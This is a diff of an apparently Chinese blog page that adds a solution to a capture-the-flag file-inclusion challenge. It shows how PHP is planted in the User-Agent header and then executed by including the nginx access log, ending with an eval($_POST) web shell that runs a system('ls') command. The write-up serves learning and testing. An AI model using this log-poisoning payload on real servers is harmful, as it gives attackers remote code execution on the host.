@@ -569,7 +569,11 @@
 <h4 id="题"><a href="#题" class="headerlink" title="题"></a>题</h4><ol>
 <li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220723145912.png"></li>
 <li>对php和data有过滤，就不能使用php://filter和data://text/plain,伪协议了</li>
-<li>wp中给出的用/var/log/nginx/access.log配置文件去解题，但是我现在还没解出来</li>
+<li>注意是先传User-Agent,到index.php中</li>
+<li>再去访问 ?file=/var/log/nginx/access.log 看看是否包含成功<pre class="line-numbers language-none"><code class="language-none">User-Agent:&lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>因为是加的http header，所以原题对传入的file值不会产生过滤<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220728151332.png"></li>
+<li>User-Agent中写post传参，传入一个变量，将变量的值设为木马，和逃逸很相似<pre class="line-numbers language-none"><code class="language-none">User-Agent:&lt;?php eval($_POST[1]);?&gt;
+1&#x3D;system(&quot;ls .&#x2F;&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
 </ol>
 
                 
@@ -1093,7 +1097,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">73.9k</span>&nbsp;字
+                class="white-color">75.7k</span>&nbsp;字
             
             
             
